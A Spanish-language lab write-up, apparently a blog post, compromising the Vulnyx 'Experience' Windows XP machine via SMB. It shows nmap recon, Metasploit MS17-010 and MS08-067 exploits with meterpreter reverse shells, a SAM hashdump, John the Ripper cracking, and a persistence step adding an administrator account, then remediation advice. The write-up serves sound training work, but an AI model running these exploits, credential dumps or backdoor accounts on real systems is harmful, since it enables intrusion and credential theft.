---
title: Vulnyx - Experience
platform: Vulnyx | Windows XP
date: 2026-02-05
tags:
  - Windows
  - SMB
  - SMB-Enumeration
  - Remote-Code-Execution
  - MS08-067
  - MS17-010
  - EternalBlue
  - Post-Exploitation
  - Vulnerability-Assessment
estado: Completado
image:
  path: /assets/images/posts/vulnyx/experience/experience.png
toc: true
toc_label: Contenido del Reporte
toc_sticky: true
---

## 1 - Reporte Ejecutivo

Durante la auditoría de seguridad realizada sobre la máquina **Experience (Windows XP)** en la plataforma Vulnyx, se identificaron vulnerabilidades críticas en el servicio SMB expuesto en el puerto 445/TCP.

El sistema resultó vulnerable a:
- **MS08-067 (CVE-2008-4250)**    
- **MS17-010 (CVE-2017-0143 – EternalBlue)**
    
Ambas permiten ejecución remota de código sin autenticación.
Se logró la explotación exitosa obteniendo acceso como:

`NT AUTHORITY\SYSTEM`

Esto implica compromiso total del sistema, incluyendo:
- Acceso completo al sistema de archivos    
- Extracción de hashes de credenciales    
- Posibilidad de movimiento lateral    
- Persistencia
    

El riesgo asociado a este tipo de vulnerabilidades es **Crítico**, ya que permitiría a un atacante desplegar ransomware, exfiltrar información o comprometer toda una red corporativa.



## 2 - Resumen

La máquina objetivo fue identificada mediante escaneo ARP y Nmap dentro del rango 10.0.2.0/24.

El TTL=128 indicó que se trataba de un sistema Windows.
El escaneo completo de puertos reveló:

- 135/tcp (MSRPC)    
- 139/tcp (NetBIOS)    
- 445/tcp (SMB)
    

El uso de scripts NSE confirmó la presencia de vulnerabilidades críticas en SMB.

Se explotaron:
1. **MS17-010** (intento inicial exitoso)    
2. **MS08-067** (explotación alternativa confirmada)
    

Se obtuvo acceso como SYSTEM mediante Meterpreter.

Posteriormente se realizó:
- Enumeración del sistema    
- Búsqueda de flags    
- Extracción de hashes    
- Análisis post-explotación    

La máquina ejecutaba:

`Windows XP SP2 (5.1.2600)`

Sistema completamente obsoleto y fuera de soporte.



## 3 - Informe tecnico

### Reconocimiento
#### Scaneo de la red con NMAP/arp-scan: #nmap #arp-scan

```bash
└─$ sudo arp-scan -l -I eth2

Interface: eth2, type: EN10MB, MAC: 08:00:27:9e:e9:b5, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:55:0a:00:02:01       (Unknown: locally administered)
10.0.2.2        08:00:27:c1:f0:0f       PCS Systemtechnik GmbH
10.0.2.3        52:55:0a:00:02:03       (Unknown: locally administered)
10.0.2.6        08:00:27:c0:6e:af       PCS Systemtechnik GmbH # <---------- EXPERIENCE
10.0.2.8        08:00:27:32:7a:dc       PCS Systemtechnik GmbH



```

```bash
└─$ sudo nmap -sn 10.0.2.0/24
MAC Address: 52:55:0A:00:02:03 (Unknown)
Nmap scan report for 10.0.2.6          # <---------- EXPERIENCE
Host is up (0.0012s latency).
MAC Address: 08:00:27:C0:6E:AF (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.8
Host is up (0.0012s latency).
MAC Address: 08:00:27:32:7A:DC (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.5

```
#### Estado de la maquina con ping:
```bash
└─$ ping -c 1 10.0.2.6
PING 10.0.2.6 (10.0.2.6) 56(84) bytes of data.
64 bytes from 10.0.2.6: icmp_seq=1 ttl=128 time=2.69 ms

--- 10.0.2.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.685/2.685/2.685/0.000 ms

```
Tenemos ttl de 128 informando que nos enfrentamos a un SO Windows
#### Nmap:
Puertos y servicios corriendo:
```bash
└─$ sudo nmap -p- --open --min-rate=5000 -vvv -n -Pn 10.0.2.8 -oX allPorts.xml

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 128
139/tcp open  netbios-ssn  syn-ack ttl 128
445/tcp open  microsoft-ds syn-ack ttl 128
MAC Address: 08:00:27:C0:6E:AF (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds



└─$ xsltproc nmap.xml -o nmap.html
└─$ python3 -m http.server 4444
```

#grepfiltradoips
```bash
└─$ sudo nmap -p- --open --min-rate=5000 -vvv -n -Pn 10.0.2.8 -oN allPorts.txt
1- port=$(cat nmap.txt | grep '^[0-9]' | cut -d '/' -f1 | sort -u | xargs | tr ' ' ',') 

2- └─$ └─$ sudo nmap -sCV -v -p$port 10.0.2.6 -oX allServices.xml          
└─$ xsltproc allSercices.xml -o allServices.html
└─$ python3 -m http.server 4444

```

![[Pasted image 20260205155717.png]]

  

![Nmap](/assets/images/posts/vulnyx/experience/nmap.png)


##### Script de nmap para reconocimiento.
Tenemos una vulnerabilidad reportada por nmap (se cambio la ip a 10.0.2.9 por un nuevo montaje.)
```bash
└─$ sudo nmap -p445 --script smb-vuln-ms08-067,smb-vuln-ms17-010,smb-vuln-ms10-061 10.0.2.9
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 14:44 +0100
Nmap scan report for 10.0.2.9
Host is up (0.0014s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:98:5F:E8 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 4.70 seconds



```

##### Explotando CVE-2017-0143]CVE:CVE-2008-4250) (Eternalblue) con metasploit  
#metasploit #eternalblue
```js
msf > use exploit/windows/smb/ms17_010_psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.0.2.6
RHOSTS => 10.0.2.6
msf exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.0.2.5
LHOST => 10.0.2.5
msf exploit(windows/smb/ms17_010_psexec) > set LPORT 4444
LPORT => 4444
msf exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_psexec) > exploit 
[*] Started reverse TCP handler on 10.0.2.5:4444 
[*] 10.0.2.6:445 - Target OS: Windows 5.1
[-] 10.0.2.6:445 - Unable to find accessible named pipe!
[*] Sending stage (190534 bytes) to 10.0.2.8
[*] Meterpreter session 1 opened (10.0.2.5:4444 -> 10.0.2.8:49741) at 2026-02-05 16:05:13 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```
Al finalizar este meterpreter por accidente no logre volver a ejecutarlo asi que pase a el exploit de **ms08-067**

```bash
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.0.2.9
msf exploit(windows/smb/ms08_067_netapi) > set LHOST 10.0.2.5
msf exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
msf exploit(windows/smb/ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.0.2.5:4444 
[*] 10.0.2.9:445 - Automatically detecting the target...
[*] 10.0.2.9:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
[*] 10.0.2.9:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
[*] 10.0.2.9:445 - Attempting to trigger the vulnerability...
[*] Sending stage (190534 bytes) to 10.0.2.9
[*] Meterpreter session 1 opened (10.0.2.5:4444 -> 10.0.2.9:1027) at 2026-02-06 14:49:28 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```




#### Acceso a la maquina

##### Buscando la flag de root.
```bash
meterpreter > shell
Process 1292 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>dir "C:\Documents and Settings" /s /b | findstr "user.txt flag.txt"
dir "C:\Documents and Settings" /s /b | findstr "user.txt flag.txt"
C:\Documents and Settings\bill\Desktop\user.txt

C:\WINDOWS\system32>type "C:\Documents and Settings\bill\Desktop\user.txt"
type "C:\Documents and Settings\bill\Desktop\user.txt"
f9e24c8da0686680decee9e594178a2e 

```

##### Comando post-explotacion.

###### 1. Enumeración del Sistema (Flags)

Lo primero es buscar las pruebas del compromiso. Generalmente hay dos: una de usuario y otra de root (Administrator).

En Meterpreter, escribe `shell` para entrar a la CMD de Windows y busca:
```Bash
# Buscar flag de usuario
dir "C:\Documents and Settings" /s /b | findstr "user.txt flag.txt"

# Buscar flag de administrador
dir "C:\Documents and Settings\Administrator\Desktop"
```

###### 2. Extracción de Credenciales (Hashdump)

Como eres SYSTEM, puedes volcar la base de datos SAM para obtener los hashes de las contraseñas. Esto es vital si hubiera otras máquinas en la red.

Sal de la shell (escribe `exit`) y en el prompt de **meterpreter** ejecuta: #hashdump
```Bash
hashdump


meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bill:1003:2db6cba1095114961bf3ece46b279e12:8b4bd2518731f75b1d3c3595cb3f0c46:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:45ab968b011c0b6cfd1e9e1b30ff40cc:916da1881680fcb38f2ce951f666d6be:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:d0d506281c0dbfe0a16f57e412411d37:::
```
**Cracking Offline con John The Ripper**

Para obtener la contraseña en texto plano, se utiliza el hash **NTLM** (la segunda cadena larga).
**Pasos en Kali Linux:**
1. **Preparación:** Crear un archivo con el hash NTLM específico.
    ```
    echo "8b4bd2518731f75b1d3c3595cb3f0c46" > bill_ntlm.txt
    ```
    
2. **Ataque de Diccionario:**
    ```
    john --format=NT bill_ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt
    ```
    
3. **Visualización de Resultados:**
    ```
    john --format=NT --show bill_ntlm.txt
    ```


###### 3. Enumeración de Red (Post-Exploitation)

A veces esta máquina es solo el puente (pivot) hacia otra. Mira las conexiones actuales y la tabla ARP:
```Bash
ipconfig
arp -a
netstat -ano
```

###### 4. Búsqueda de Archivos Sensibles

Busca archivos de configuración o notas que el administrador haya dejado:
```Bash
# Buscar archivos con la palabra "pass" o "config"
shell
cd \
dir /s *pass* == *config* == *user*
```

###### 5. Persistencia (Opcional pero recomendado en Obsidian)

Si quieres asegurar que no perderás el acceso si la máquina se reinicia:
```Bash
# Crear un usuario administrador nuevo
net user backup Pass123! /add
net localgroup administrators backup /add
```



---



### 🔎 Análisis de Vulnerabilidades

#### MS08-067 – CVE-2008-4250

Vulnerabilidad en el servicio Server de Windows que permite ejecución remota de código mediante manipulación de solicitudes RPC malformadas.

Características:

- No requiere autenticación
    
- Ejecuta código como SYSTEM
    
- Afecta Windows 2000, XP y 2003
    

Impacto real:  
Compromiso total del sistema sin interacción del usuario.

---

#### MS17-010 – CVE-2017-0143 (EternalBlue)

Vulnerabilidad en el protocolo SMBv1.

Fue utilizada por el ransomware WannaCry en 2017.

Permite:

- Ejecución remota de código
    
- Movimiento lateral automatizado
    
- Compromiso masivo en redes internas
    

Se considera una de las vulnerabilidades más críticas en entornos Windows legacy.

---

### 🔐 Impacto del Compromiso

Tras la explotación se obtuvo acceso como:

`NT AUTHORITY\SYSTEM`

Esto implica:

- Control absoluto del sistema
    
- Acceso a SAM
    
- Extracción de hashes NTLM
    
- Creación de usuarios persistentes
    
- Posibilidad de pivoting
    
- Instalación de malware o ransomware
    

En un entorno corporativo real, este nivel de acceso permitiría:

- Escalada hacia controladores de dominio
    
- Ataques Pass-the-Hash
    
- Movimiento lateral automatizado
    
- Exfiltración de información sensible
    

El nivel de riesgo es **CRÍTICO**.

---

### 🧠 Post-Explotación – Análisis Profesional

Se realizó:

- Enumeración de usuarios locales
    
- Volcado de hashes mediante `hashdump`
    
- Identificación de cuentas activas
    
- Análisis de potencial reutilización de credenciales
    

El hash NTLM del usuario `bill` fue extraído correctamente.

En un entorno real se podría:

- Intentar Pass-the-Hash
    
- Reutilizar credenciales en otros equipos
    
- Enumerar si el equipo pertenece a un dominio (systeminfo / net config workstation)
    

No se identificó pertenencia a Active Directory en este laboratorio.

---

### 🛡️ Recomendaciones de Remediación

1. Aplicar parches de seguridad MS08-067 y MS17-010.
    
2. Deshabilitar SMBv1.
    
3. Migrar el sistema operativo (Windows XP está fuera de soporte).
    
4. Implementar segmentación de red.
    
5. Restringir acceso al puerto 445/TCP.
    
6. Implementar soluciones EDR.
    
7. Monitorizar intentos de explotación SMB.
    

---

### 📌 Nota Técnica

Durante el laboratorio la máquina fue reiniciada y cambió de IP:

`10.0.2.6 → 10.0.2.8 → 10.0.2.9`

Esto explica la variación observada en los escaneos y explotación.

---

## Conclusiones

Durante el laboratorio se logró el compromiso completo de una máquina Windows XP vulnerable a MS08-067 y MS17-010.

Se obtuvo ejecución remota de código sin autenticación y acceso con privilegios NT AUTHORITY\SYSTEM, permitiendo:

- Acceso total al sistema
    
- Extracción de hashes
    
- Potencial movimiento lateral
    
- Persistencia
    

El sistema presenta vulnerabilidades críticas explotables remotamente que permitirían a un atacante comprometer completamente la infraestructura.

Se recomienda aplicar parches inmediatamente, deshabilitar SMBv1 y migrar a sistemas operativos soportados.

El laboratorio demuestra la importancia de mantener los sistemas actualizados y segmentar adecuadamente la red interna.